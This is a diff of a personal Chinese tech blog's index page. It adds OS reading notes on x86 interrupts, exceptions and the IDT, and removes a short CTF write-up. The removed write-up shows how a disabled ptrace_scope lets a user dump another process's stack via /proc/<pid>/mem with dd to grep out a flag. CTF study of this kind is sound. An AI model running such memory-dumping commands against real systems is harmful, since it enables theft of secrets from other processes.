@@ -159,6 +159,176 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/14/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B003/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="hkbin">
+      <meta itemprop="description" content="hkbin hkbin hkbin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hkbin的小博客~">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/14/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B003/" class="post-title-link" itemprop="url">操作系统读书笔记03</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-10-14 19:54:27 / 修改时间：19:56:34" itemprop="dateCreated datePublished" datetime="2023-10-14T19:54:27+08:00">2023-10-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">操作系统</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>15 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="os读书笔记3"><a href="#os读书笔记3" class="headerlink" title="os读书笔记3"></a>os读书笔记3</h1><h1 id="中断和异常处理"><a href="#中断和异常处理" class="headerlink" title="中断和异常处理"></a>中断和异常处理</h1><h2 id="中断和异常处理概述"><a href="#中断和异常处理概述" class="headerlink" title="中断和异常处理概述"></a>中断和异常处理概述</h2><h3 id="什么是中断和异常"><a href="#什么是中断和异常" class="headerlink" title="什么是中断和异常?"></a>什么是中断和异常?</h3><p>中断和异常是强制性的执行流转移。效果是从当前正在执行的程序和任务转移到一个特殊的句柄的例程或任务。</p>
+<p>中断产生于硬件发出信号，中断的产生是随机的，对正在执行的程序来说是异步的。</p>
+<p>软件对于外部设备的请求，比如IO读入、调用别的硬件设备的情况下可以产生中断，使用的是INT n指令。</p>
+<p>异常是在处理器执行指令的过程中发现错误而产生的，比如除零异常等。</p>
+<p>处理器可以检测出多种不同的错误，包括保护异常，页错误，内部机器错误。</p>
+<h3 id="处理器如何处理？"><a href="#处理器如何处理？" class="headerlink" title="处理器如何处理？"></a>处理器如何处理？</h3><p>处理器收到中断信号或检测到异常时，便会挂起当前正在运行的进程或任务，前去执行中断或异常处理程序，中断或异常处理程序执行完之后，处理器一般会继续执行被终端的进程或者任务，有两种情况例外：无法从发生的异常中恢复、中断使当前的程序终止。</p>
+<h3 id="实模式和保护模式下，中断向量表一样吗？"><a href="#实模式和保护模式下，中断向量表一样吗？" class="headerlink" title="实模式和保护模式下，中断向量表一样吗？"></a>实模式和保护模式下，中断向量表一样吗？</h3><p>在实模式和保护模式下，中断向量表是不一样的。在实模式下，中断向量表是一个固定的地址，称为中断向量表基址，其中包含了一系列的中断向量，每个向量对应着一个特定的中断号。而在保护模式下，中断向量表被称为中断描述符表，它保存了每个中断的处理程序地址和相关的属性信息。</p>
+<h2 id="有关中断和异常了解性的内容"><a href="#有关中断和异常了解性的内容" class="headerlink" title="有关中断和异常了解性的内容"></a><strong><strong>有关中断和异常了解性的内容</strong></strong></h2><h3 id="异常和中断向量"><a href="#异常和中断向量" class="headerlink" title="异常和中断向量"></a>异常和中断向量</h3><p>异常和中断向量存储着每种异常、中断对应的处理程序的入口地址。</p>
+<p>异常向量和中断向量的作用是将发生的异常和中断与相应的处理程序关联起来，使处理器能够根据异常或中断类型找到对应的处理程序并进行处理。这样可以保证系统能够有效地响应和处理异常和中断事件。</p>
+<p>向量号0到31分配给异常和NMI中断使用，但是未完全使用，部分未使用的作为保留留给未来使用。</p>
+<p>32到255之间的向量号留给用户使用。</p>
+<p>这些中断不在 Intel 的保留部分之列，一般被分配给外部 I&#x2F;O 设备，允许它们通过某个外部硬件中断机制向处理器传递信号。</p>
+<h3 id="中断源和异常源"><a href="#中断源和异常源" class="headerlink" title="中断源和异常源"></a>中断源和异常源</h3><p><strong>中断源</strong></p>
+<p>中断有两个来源，一个是硬件中断(外部中断)，另一个是软件中断。</p>
+<p><strong>硬件中断</strong>是通过处理器的引脚接收的。任何通过 INTR 引脚或局部 APIC 传递到处理器的外部中断都被称作可屏蔽硬件中断。通过INTR 引脚传递的可屏蔽硬件中断可使用所有 Intel 架构定义的中断向量(0<del>255)；而通过局部 APIC 传递的部分只能使用 16</del>255 号向量。使用 EFLAGS 寄存器的 IF 位就可以屏蔽全部可屏蔽硬件中断。当 0 号中断到 15 号中断通过局部 APIC 传递时，APIC 会指出错误的向量号。</p>
+<p><strong>软件中断</strong></p>
+<p>将中断向量号作为 INT 指令的操作数即可通过 INT 指令在程序中产生中断。比如，指令 INT 35 即可调用第 35 号中断处理例程。<br>0 到 255 号中断均可使用 INT 指令调用。但是，当处理器预先定义好的 NMI 中断被这样调用时，处理器作出的响应与真正 NMI 中断发生时的响应并不一样。也就是说，执行 INT 2(NMI的向量号)时，NMI 处理例程被调用，但是处理器的 NMI 硬件处理并未被激活。<br>EFLAGS 的 IF 位并不能屏蔽由 INT 指令产生的中断。</p>
+<p><strong>异常源</strong></p>
+<p>异常信号有三个来源，一个是处理器检测到的程序错误异常，一个是软件产生的异常，另外一个是机器检测异常。</p>
+<ul>
+<li>程序错误异常：当检测到程序错误异常时，处理器产生一个或多个异常。Intel 为每个处理器可检测到的异常定义了一个向量号。异常又进一步被划分为错误，陷阱和终止。</li>
+<li>软件产生的异常：INTO，INT 3和BOUND指令允许在软件中产生异常。这些指令允许在指令流中检测指定的异常条件。</li>
+<li>机器检测异常：P6 系列和 Pentium 处理器同时提供了内部和外部的机器检测机制，用来检查内部芯片部件的操作和总线传输。这些机制组成了扩展异常机制（并不能独立完成）。当检测到一个机器检测错误时，处理器发出一个机器检测异常（18 号向量），并返回一个出错码。</li>
+</ul>
+<h3 id="异常的分类：故障、陷阱和中止"><a href="#异常的分类：故障、陷阱和中止" class="headerlink" title="异常的分类：故障、陷阱和中止"></a>异常的分类：故障、陷阱和中止</h3><p><strong>故障</strong>是一种通常能被修正的异常，修正过后，程序能够不失连续性地继续运行。当报告错误发生时，处理器将机器状态恢复到执行错误之前的状态。</p>
+<p>错误处理程序的返回地址和EIP指向产出错误的指令。</p>
+<p>只有少数几个异常被报告为错误，它们是不可恢复的，且处理器的上下文中的内容也会有部分丢失。</p>
+<p>一个例子：当执行 POPAD<br>指令是堆栈越过了堆栈段的尾部。异常处理例程会看到 CS：EIP 恢复原样，就好象 POPAD从未执行，但处理器状态却被改变了（通用寄存器）。</p>
+<p>这种情况被视为程序错误，若应用程序产生这样的错误则会被操作系统终止。</p>
+<p><strong>陷阱</strong>是一种异常，当引起陷阱的指令发生时，马上产生该异常。陷阱不影响程序的连续性，陷阱处理程序的返回地址指向引起陷阱指令的下一条指令。</p>
+<p><strong>中止</strong>是另一种异常，它并不总是报告产生异常指令的确切位置，也不允许引起终止的进程或任务重新执行。中止被用于报告严重错误，比如硬件错误，不一致或非法系统值。</p>
+<h3 id="程序或任务的重新执行"><a href="#程序或任务的重新执行" class="headerlink" title="程序或任务的重新执行"></a>程序或任务的重新执行</h3><p>对于故障类异常，返回地址指向产生错误的指令。所以当错误处理程序返回时，产生错误的指令将会重新执行。常见的错误就是缺页错误，错误处理程序会调用mmap一段内存再返回，这个时候再执行一次产生错误的指令，使程序不失去连续性。</p>
+<p>对于陷阱类异常，返回地址指向产生陷阱指令的下一条指令。当一条转移指令执行过程中检测到陷阱时，返回地址指针则反映了执行转向的情况。比如当执行JMP指令时，检测到有陷阱异常，返回地址指针指向的是JMP的目的地址，而不是JMP指令后的下一条指令。所有的陷阱异常保证进程或任务的继续执行不失连续性。</p>
+<p>中止类异常不支持程序或任务继续执行。终止处理例程的作用是：当有终止异常发生时，收集处理器的各种相关诊断信息，并关闭进程或系统。</p>
+<h3 id="开启和禁止中断"><a href="#开启和禁止中断" class="headerlink" title="开启和禁止中断"></a>开启和禁止中断</h3><p>根据处理器的状态和 EFLAGS 的 IF 位和 RF 位，处理器可以禁止某些中断的产生。</p>
+<p>任何通过 INTR 引脚或局部 APIC 传递到处理器的外部中断都被称作可屏蔽硬件中断。通过INTR 引脚传递的可屏蔽硬件中断可使用所有 Intel 架构定义的中断向量(0<del>255)；而通过局部 APIC 传递的部分只能使用 16</del>255 号向量。</p>
+<p>使用 EFLAGS 寄存器的 IF 位就可以屏蔽全部可屏蔽硬件中断。当 0 号中断到 15 号中断通过局部 APIC 传递时，APIC 会指出错误的向量号</p>
+<h3 id="异常和中断的优先级"><a href="#异常和中断的优先级" class="headerlink" title="异常和中断的优先级"></a>异常和中断的优先级</h3><p>指令边界有多个异常或中断发生，处理器将以预定的顺序来为它们提供服务。</p>
+<p>各类异常和中断源的优先关系如图所示：</p>
+<p><img src="/./images/images/img1.png" alt="Untitled"></p>
+<h2 id="中断描述符表"><a href="#中断描述符表" class="headerlink" title="中断描述符表"></a><strong><strong>中断描述符表</strong></strong></h2><p>中断描述符表(IDT)为每一个异常或中断向量对应的例程或任务分配了一个门描述符。和GDT和LDT一样，IDT也是由一系列由 8 个字节组成的描述符组成的(保护模式下)。和 GDT 不同的是，IDT 中的第一个元不是 NULL 描述符。异常或中断向量号乘上 8 即可得到IDT 中的描述符的索引（即门描述符包含的字节数）由于只有 256 个中断或异常向量，所以 IDT 不必包含多于 256 个描述符。并且可以包含不足 256 个的描述符，因为只有那些确实发生的异常或中断才需要一个描述符。所有 IDT 中的空描述符须将存在位置位 0。</p>
+<h3 id="如何构成？"><a href="#如何构成？" class="headerlink" title="如何构成？"></a>如何构成？</h3><p>和GDT表类似，构成由：</p>
+<ol>
+<li><p>段选择子：IDT 中的每个条目都由一个段选择子组成，用于标识处理程序所在的代码段或数据段。</p>
+</li>
+<li><p>偏移量：每个中断或异常都有一个关联的处理程序，偏移量用于指示处理程序在代码段中的起始位置。</p>
+</li>
+<li><p>标志位：IDT 中的每个条目还包含一些标志位，用于定义中断或异常的类型、访问权限等。</p>
+</li>
+</ol>
+<p>IDT 的结构是一个数组，每个数组元素代表一个中断向量，从 0 到 255。</p>
+<h3 id="如何获得中断处理程序的地址？"><a href="#如何获得中断处理程序的地址？" class="headerlink" title="如何获得中断处理程序的地址？"></a>如何获得中断处理程序的地址？</h3><p>在操作系统初始化过程中，会将中断处理程序的地址注册到中断向量表中的相应条目中。</p>
+<p>当中断发生时，CPU根据中断号从中断向量表中找到对应的条目，并获取其中保存的中断处理程序的地址。CPU会跳转到这个地址，开始执行中断处理程序。</p>
+<p>即通过访问中断向量表对应的条目来获得中断处理程序的地址。</p>
+<h3 id="如何设置中断描述符表寄存器？"><a href="#如何设置中断描述符表寄存器？" class="headerlink" title="如何设置中断描述符表寄存器？"></a>如何设置中断描述符表寄存器？</h3><p>构建好IDT表之后，在x86架构下，可以使用lidt汇编指令加载IDTR寄存器，IDTR寄存器是CPU的寄存器，用来存储IDT表的基地址和大小。</p>
+<p><img src="/./images/images/img2.png" alt="Untitled"></p>
+<h2 id="IDT-描述符"><a href="#IDT-描述符" class="headerlink" title="IDT 描述符"></a><strong><strong>IDT 描述符</strong></strong></h2><p>IDT包含以下三种门描述符</p>
+<ul>
+<li>任务门描述符</li>
+<li>中断门描述符</li>
+<li>陷阱们描述符</li>
+</ul>
+<p><img src="/./images/images/img3.png" alt="Untitled"></p>
+<p>任务门格式和GDT&#x2F;LDT中的任务门一样，包含异常或中断处理程序的TSS的段选择符</p>
+<p>中断门和陷阱门和调用门类似，包含一个指针(段选择符和offset)，处理器用来将执行流转移至异常或中断处理代码段中的处理程序。但是在处理EFLAGS的IF位的方式上有所不同。</p>
+<h2 id="中断与异常处理"><a href="#中断与异常处理" class="headerlink" title="中断与异常处理"></a><strong><strong>中断与异常处理</strong></strong></h2><h3 id="中断过程调用的流程是怎样的？"><a href="#中断过程调用的流程是怎样的？" class="headerlink" title="中断过程调用的流程是怎样的？"></a>中断过程调用的流程是怎样的？</h3><p>当程序触发中断时，会通过IDTR查询IDT，获得中断处理程序的段选择子和偏移，再查询GDT或LDT获得段描述符，配合生成一个指向中断处理程序的地址，之后将EFLAGS寄存器、CS寄存器、EIP寄存器的当前值压栈保存，然后转到中断处理程序执行，执行完返回到程序中正常执行。</p>
+<p><img src="/./images/images/img4.png" alt="Untitled"></p>
+<h3 id="不同优先级上，处理方式一样吗？"><a href="#不同优先级上，处理方式一样吗？" class="headerlink" title="不同优先级上，处理方式一样吗？"></a>不同优先级上，处理方式一样吗？</h3><p>不一样。</p>
+<p>相同优先级的情况下，不会发生堆栈切换。</p>
+<p>而中断程序优先级高于原程序的情况下，会发生堆栈切换。</p>
+<p>中断程序优先级低于原程序的情况下，则会发生报错。</p>
+<h3 id="如果发生堆栈切换，处理器会做哪些操作？"><a href="#如果发生堆栈切换，处理器会做哪些操作？" class="headerlink" title="如果发生堆栈切换，处理器会做哪些操作？"></a>如果发生堆栈切换，处理器会做哪些操作？</h3><p><img src="/./images/images/img5.png" alt="Untitled"></p>
+<p>指向返回后使用的栈指针也被压入栈中，也就是SS寄存器和ESP寄存器。处理器要用到的堆栈段选择符和栈指针则从当前进程的TSS中得到。</p>
+<p>处理器将 EFLAGS，SS，ESP，CS，EIP，还有出错码从当前进程的堆栈拷贝到处理例程的堆栈。</p>
+<p>在处理程序执行完毕返回的时候还需要还原堆栈。</p>
+<h3 id="如果没发生堆栈切换，处理器会做哪些操作？"><a href="#如果没发生堆栈切换，处理器会做哪些操作？" class="headerlink" title="如果没发生堆栈切换，处理器会做哪些操作？"></a>如果没发生堆栈切换，处理器会做哪些操作？</h3><p>没有发生对战切换，处理程序和原程序将会使用同一个堆栈。处理器会将Error Code，EIP，CS，EFLAGS压入栈中。</p>
+<p>处理程序执行完毕返回的时候只需要还原EIP即可。</p>
+<h3 id="中断处理过程后，如何返回，处理器做了哪些操作？"><a href="#中断处理过程后，如何返回，处理器做了哪些操作？" class="headerlink" title="中断处理过程后，如何返回，处理器做了哪些操作？"></a>中断处理过程后，如何返回，处理器做了哪些操作？</h3><p>处理器会将压入栈的内容弹出来，恢复寄存器。</p>
+<p>弹出EFLAGS寄存器值即可恢复EFLAGS寄存器至执行中断处理程序前。</p>
+<p>弹出CS、EIP等即可恢复。</p>
+<p>如果在调用处理例程时堆栈发生了切换，则在返回时，IRET 指令还将切换回被中断进程的堆栈。</p>
+<h3 id="异常和中断处理过程的保护"><a href="#异常和中断处理过程的保护" class="headerlink" title="异常和中断处理过程的保护"></a>异常和中断处理过程的保护</h3><p>如果异常和中断处理例程的特权级比 CPL 底，则处理器不允许这种调用发生。否则将产生通用保护异常（#GP）。</p>
+<p>因为中断和异常向量没有 RPL，所以当发生中断和异常时，并不检查 RPL。</p>
+<p>仅当中断或异常由 INT n, INT 3，或 INTO 指令产生时，处理器才检查中断或陷阱门的DPL。此时，CPL 必须小于或等于门的 DPL。这种限制防止了运行于 3 级的应用程序或进程使用软件中断来访问异常处理的关键代码，如页错误处理例程，因为这些例程位于更高一级的代码段中（数值上更小的特权级）。对于由硬件产生的中断和处理器检测到的异常，处理器则忽略掉中断或陷阱门中的 DPL。</p>
+<p>异常和中断的发生通常是随机的，这些特权规则有效地为异常和中断处理例程能运行在哪些特权级加上了限制。</p>
+<h3 id="异常和中断处理过程的标志使用方式"><a href="#异常和中断处理过程的标志使用方式" class="headerlink" title="异常和中断处理过程的标志使用方式"></a>异常和中断处理过程的标志使用方式</h3><p>访问异常或中断处理程序时，在将EFLAGS寄存器的内容保存进栈后，处理器会清EFLAGS寄存器的TF位。</p>
+<p>当调用异常和中断处理例程时，处理器在将 EFLAGS寄存器的内容保存进栈后，还会清 VM，RF，和 NT 位。</p>
+<p>清 TF 位则可以禁止指令跟踪，以使中断响应不受影响。后继的 IRET 指令则使用保存在栈中的 EFLAGS 寄存器中的值，恢复TF（和 VM，RF，及 NT）位。</p>
+<h3 id="中断门与陷阱门的唯一区别是什么？"><a href="#中断门与陷阱门的唯一区别是什么？" class="headerlink" title="中断门与陷阱门的唯一区别是什么？"></a>中断门与陷阱门的唯一区别是什么？</h3><p>在于处理器处理EFLAGS寄存器的IF位的方式。</p>
+<p>当通过中断门访问异常或中断处理例程时，处理器清除 IF 位，阻止别的中断干扰当前的中断处理程序。后继的 IRET 指令用存储在栈中的 EFLAGS 的内容恢复 IF 的值。</p>
+<p>而陷阱门调用处理程序时，IF 位不受影响。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/13/%E4%BF%A1%E6%81%AF%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-%E8%A2%AB%E5%8A%A8%E6%8D%95%E5%8C%85/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1409,109 +1579,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/24/catctf-injection2-0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/header.png">
-      <meta itemprop="name" content="hkbin">
-      <meta itemprop="description" content="hkbin hkbin hkbin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hkbin的小博客~">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/09/24/catctf-injection2-0/" class="post-title-link" itemprop="url">catctf injection2.0</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-09-24 13:26:08" itemprop="dateCreated datePublished" datetime="2023-09-24T13:26:08+08:00">2023-09-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-25 20:23:33" itemprop="dateModified" datetime="2023-09-25T20:23:33+08:00">2023-09-25</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/kernel/" itemprop="url" rel="index"><span itemprop="name">kernel</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>289</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>这是一种比较好玩的题</p>
-<p>漏洞在这里 init文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> 0 | <span class="built_in">tee</span> /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line"><span class="built_in">chown</span> 0:0 flag</span><br><span class="line"><span class="built_in">chmod</span> 755 flag</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">./target &gt;pso.file 2&gt;&amp;1 &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line"><span class="comment">#setsid /bin/cttyhack setuidgid 0 /bin/sh # 修改 uid gid 为 0 以提权 /bin/sh 至 root。</span></span><br></pre></td></tr></table></figure>
-
-<p>其中这一句echo 0 | tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope</p>
-<p>关闭了ptrace的保护，原本默认为1，使得ptrace只能追踪父进程</p>
-<p>但是设为0即可追踪所有进程</p>
-<p>所以可以</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps -ef -&gt;找到./target进程的pid (IDA分析./target发现flag已经读到栈里，并且之后<span class="keyword">while</span> 1死循环</span><br><span class="line"><span class="built_in">cat</span> /proc/$(pidof target)/maps找到栈起始末尾地址</span><br><span class="line"><span class="built_in">dd</span>指令可以分析内存</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/proc/$(pidof target)/mem skip=栈起始地址 bs=1(每次1bytes) count=135168(总共) |grep ...</span><br></pre></td></tr></table></figure>
-
-<p>一步到位：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack=$(<span class="built_in">printf</span> %d <span class="string">&quot;0x<span class="subst">$(grep stack /proc/$(pidof target)</span>/maps | sed -n &#x27;s/^\([0-9a-f]*\)-.*$/\1/p&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/proc/$(pidof target)/mem skip=<span class="variable">$stack</span> bs=1 count=135168|grep cyber</span><br></pre></td></tr></table></figure>
-
-<p><img src="/./images/catctf-injection-pics/Untitled.png" alt="Untitled"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1583,7 +1650,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-count">15</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1641,13 +1708,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">18k</span>
+    <span title="站点总字数">22k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">1:07</span>
+    <span title="站点阅读时长">1:21</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
